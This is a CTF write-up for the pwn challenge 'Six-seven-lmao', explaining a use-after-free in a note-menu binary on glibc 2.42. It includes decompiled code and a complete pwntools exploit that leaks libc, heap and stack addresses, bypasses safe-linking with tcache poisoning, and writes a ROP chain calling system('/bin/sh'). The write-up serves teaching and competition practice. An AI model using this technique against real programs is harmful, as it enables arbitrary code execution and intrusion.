---
layout: post
title: "0xFunCTF2026 Writeup :: Six-seven-lmao"
date: 2026-02-21
categories: [Writeups, 0xFunCTF2026]
tags: [writeup, heap, tcache, pwn, rop, glibc2.42, UAF]
---

- Challenge: Six-seven-lmao
- Category: pwn

## Introduction

This challenge targets a heap vulnerability on **glibc 2.42**, a modern allocator hardened with safe-linking and strengthened integrity checks. The mission is straightforward: achieve remote code execution and read the flag.

This write-up describes the exploitation of a Use-After-Free (UAF) vulnerability to disclose heap, libc, and stack addresses through tcache poisoning, followed by constructing a ROP chain to achieve arbitrary code execution.

## Reverse Engineering the Binary

The binary exposes a minimal heap interface: create, delete, read, edit, and exit.

### main function

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax

  init(argc, argv, envp);
  while ( 1 )
  {
    menu();
    v3 = get_int();
    if ( v3 == 5 )
      exit(0);
    if ( v3 > 5 )
    {
LABEL_14:
      puts("Invalid option");
    }
    else
    {
      switch ( v3 )
      {
        case 4:
          edit_note();
          break;
        case 3:
          read_note();
          break;
        case 1:
          create_note();
          break;
        case 2:
          delete_note();
          break;
        default:
          goto LABEL_14;
      }
    }
  }
}
```

Everything interesting happens inside the four heap primitives.

---

### create_note function

```c
unsigned __int64 create_note()
{
  signed int v1; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 < 0xA )
  {
    printf("Size: ");
    v2 = get_int();
    if ( v2 > 0 && v2 <= 1024 )
    {
      *((_QWORD *)&notes + v1) = malloc(v2);
      sizes[v1] = v2;
      printf("Data: ");
      read(0, *((void **)&notes + v1), v2);
      puts("Note created!");
    }
    else
    {
      puts("Invalid size");
    }
  }
  else
  {
    puts("Invalid index");
  }
  return v3 - __readfsqword(0x28u);
}
```

We fully control:

- Index (0–9)
- Allocation size (≤ 1024)
- Heap content

This gives us deterministic heap layout control.

### delete_note function :: **Vulnerable**

```c
unsigned __int64 delete_note()
{
  signed int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 <= 9 && *((_QWORD *)&notes + v1) )
  {
    free(*((void **)&notes + v1));
    puts("Note deleted!");
  }
  else
  {
    puts("Invalid index");
  }
  return v2 - __readfsqword(0x28u);
}
```

The delete routine frees the chunk but does not clear either the pointer in `notes[]` or the corresponding `sizes[]` entry.

This creates a classic **use-after-free** condition:

- Freed pointer remains accessible
- Size metadata remains intact

The program continues to trust memory that the allocator no longer owns.

### read_note function :: Read-After-Free

```c
unsigned __int64 read_note()
{
  signed int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 <= 9 && *((_QWORD *)&notes + v1) )
  {
    printf("Data: ");
    write(1, *((const void **)&notes + v1), sizes[v1]);
    puts(&byte_2094);
  }
  else
  {
    puts("Invalid index");
  }
  return v2 - __readfsqword(0x28u);
}
```

Because freed pointers are not nulled, this becomes a **read-after-free primitive**.

We can read allocator metadata from freed chunks, including:

- Unsorted bin pointers → libc leak
- Safe-linked tcache pointers → heap leak

This is our information disclosure primitive.

### edit_note function :: Write-After-Free

```c
unsigned __int64 edit_note()
{
  signed int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("Index: ");
  v1 = get_int();
  if ( (unsigned int)v1 <= 9 && *((_QWORD *)&notes + v1) )
  {
    printf("New Data: ");
    read(0, *((void **)&notes + v1), sizes[v1]);
    puts("Note updated!");
  }
  else
  {
    puts("Invalid index");
  }
  return v2 - __readfsqword(0x28u);
}
```

This provides a **write-after-free primitive**.

We can overwrite metadata of freed chunks, enabling:

- Tcache poisoning
- Safe-linking bypass
- Arbitrary allocation redirection

## Exploiting the Binary

As usual in heap challenges, we start by wrapping the menu operations to keep the exploit clean and deterministic.

```python
def malloc(index, size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def free(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Index: ", str(idx))

def read(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter("Index: ", str(idx))

def edit(index, data):
    p.sendlineafter("> ", "4")
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("New Data: ", data)
```

Now we can shape the heap precisely and move to the first step: leaking libc.

### Libc leak

```python
# allocate 9 chunks (size 0x90 including metadata)
for i in range(9):
    malloc(i, 0x88, b'asdf')

# fill tcache (7 entries for this size class)
for i in range(7):
    free(i)

# next free goes to unsorted bin
free(7)

# leak main_arena pointer from unsorted bin chunk
read(7)

p.recvuntil("Data: ")
leak = u64(p.recvline()[:8].ljust(8, b'\x00'))
log.success(f"libc leak = {hex(leak)}")
```

We free `7` chunks to fill tcache, then free index `7` so it lands in the unsorted bin (no consolidation because index `8` remains allocated). The unsorted bin chunk stores a pointer to `main_arena`, which points into libc.

```python
base = leak - 0x1e7ba0
libc.address = base

log.success(f"This is libc base = {hex(libc.address)}")
```

The leaked pointer belongs to `main_arena`.
By subtracting its known offset (`0x1e7ba0`), we recover the libc base address.

### Heap leak

```python
malloc(0, 0x48, 'ffffffffffff')
free(0)

read(0)

p.recvuntil("Data: ")
leak = u64(p.recvline()[:8].ljust(8, b'\x00'))

# as it's the head of the 0x50 tcache we only need to 12 bit shift to the left
heap = leak << 12

log.success(f'This is heap leak = {hex(heap)}')
```

The `fd` pointer of a tcache `0x50` chunk is safe-linked (mangled). Because it is the head of the tcache list, only the lower 12 bits are randomized; shifting left by `12` demangles it and yields the heap base address.

Good. Let’s write it properly.

### Stack address leak

```py
environ = libc.sym.environ  # libc symbol that stores a pointer to the stack

chunk_add = heap + 0x700
mang = (chunk_add >> 12) ^ (environ - 24)

# poison tcache fd with properly mangled target
edit(0, p64(mang))

# first allocation returns the original chunk (removes poisoned entry)
malloc(0, 0x48, 'aaaa')

# second allocation returns a chunk overlapping environ-24
payload  = p64(0xdaedbeefdeadbeef) * 3
p.sendlineafter("> ", "1")
p.sendlineafter("Index: ", "0")
p.sendlineafter("Size: ", "72")
p.sendafter("Data: ", payload)

read(0)

p.recvline()
leak = u64(p.recvline()[30:38].ljust(8, b'\x00'))
log.success(f"This is stack leak = {hex(leak)}")
```

We now pivot from heap control to stack disclosure.

- `libc.sym.environ` holds a pointer into the stack.
- We poison the `0x50` tcache entry so that the next allocation returns a chunk at `environ - 24`.
- Because of safe-linking, the target must be mangled as `(heap_chunk >> 12) ^ target`.

After two allocations, we get a chunk overlapping `environ`.
Reading it leaks a real stack address.

#### why `environ - 24`?

If we allocate at **`environ` directly**, it's not 16-byte aligned (heap chunks must be aligned to 0x10), so the allocator rejects it.

If we use **`environ - 8`**, the data we write overlaps the `key` field, which gets cleared and breaks the leak.

So we use **`environ - 24`** because:

- it is properly aligned
- it avoids corrupting metadata that would null the value
- it lets us leak the stack address reliably

### RSP Control

```py
malloc(0, 0x58, 'cccccc')
free(0)

rsp = leak - 336  # calculate saved return location from leaked stack address

# poison 0x60 tcache to target (rsp - 8)
payload = (chunk_add >> 12) ^ (rsp - 8)
edit(0, p64(payload))

pop_rdi = libc.address + 0x0000000000102dea
ret     = libc.address + 0x00000000000efc6b

# first allocation removes poisoned entry
malloc(0, 0x58, 'aaaaa')

# second allocation returns chunk overlapping saved RIP
payload  = p64(0xdeadbeef)          # padding
payload += p64(ret)                 # stack alignment
payload += p64(pop_rdi)             # control RDI
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)     # system("/bin/sh")

malloc(0, 0x58, payload) # write the ROP chain to the stack

p.interactive()
```

We now pivot from heap control to control over the return address.

- From the leaked stack pointer, we compute `rsp`.
- We poison the 0x60 tcache entry to point to `rsp - 8` (properly mangled).
- After two allocations, we obtain a chunk overlapping the saved return address.

We overwrite it with a ROP chain:

`ret → pop rdi → "/bin/sh" → system`

Execution returns into our chain, and we get a shell.

At this point, the allocator is no longer a defense.

## Full Exploit

```py
from pwn import *
import sys

# fileName = './chall'
fileName = './chall_patched'

e = ELF(fileName)
libc = e.libc
context.arch = 'amd64'
p = process(fileName)


if 'd' in sys.argv:
    gdb.attach(p,'''
        b *main
    ''')

if 'r' in sys.argv:
    p = remote('')


def malloc(index,size,data) :
    p.sendlineafter("> ","1")
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("Size: ",str(size))
    p.sendlineafter("Data: ",data)



def free(idx) :
    p.sendlineafter("> ","2")
    p.sendlineafter("Index: ",str(idx))



def read(idx) :
    p.sendlineafter("> ","3")
    p.sendlineafter("Index: ",str(idx))



def edit(index,data) :
    p.sendlineafter("> ","4")
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter("New Data: ",data)




for i in range(9):
    malloc(i, 0x88, b'asdf')


for i in range(7):
    free(i)

free(7) # unsorted bin

read(7)

p.recvuntil("Data: ")
leak = u64(p.recvline()[:8].ljust(8,b'\x00'))
log.success(f'This is libc leak = {hex(leak)}')

base = leak - 0x1e7ba0
libc.address = base

log.success(f'This is libc base = {hex(libc.address)}')

malloc(0, 0x48, 'ffffffffffff')
free(0)

read(0)

p.recvuntil("Data: ")
leak = u64(p.recvline()[:8].ljust(8,b'\x00'))
heap = leak << 12
log.success(f'This is heap leak = {hex(leak)}')


environ = libc.sym.environ

chunk_add = heap + 0x700
mang = (chunk_add >> 12) ^ (environ-24)

edit(0, p64(mang))

malloc(0, 0x48, 'aaaa')

payload = p64(0xdaedbeefdeadbeef)
payload += p64(0xdaedbeefdeadbeef)
payload += p64(0xdaedbeefdeadbeef)
p.sendlineafter("> ","1")
p.sendlineafter("Index: ",'0')
p.sendlineafter("Size: ",'72')
p.sendafter("Data: ",payload)


read(0)

print(p.recvline)
leak = u64(p.recvline()[30:38].ljust(8,b'\x00'))
log.success(f'This is stack leak = {hex(leak)}')


malloc(0, 0x58, 'cccccc')
free(0)

rsp = leak - 336

payload = (chunk_add >> 12) ^ (rsp-8)
edit(0, p64(payload))

pop_rdi = libc.address + 0x0000000000102dea
ret = libc.address + 0x00000000000efc6b

malloc(0, 0x58, 'aaaaa')
payload = p64(0xdeadbeef)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym.system)
malloc(0, 0x58, payload)


p.interactive()
```

## Conclusion 🏆

Heap exploitation challenge: use-after-free, leaks, safe-linking bypass, and memory manipulation to achieve code execution by understanding allocator behavior. The next challenge (**six-seven-revenge**) is harder: no **use-after-free**, no **heap overflow** or **double free**, freed pointers are cleared, and seccomp restricts system calls.
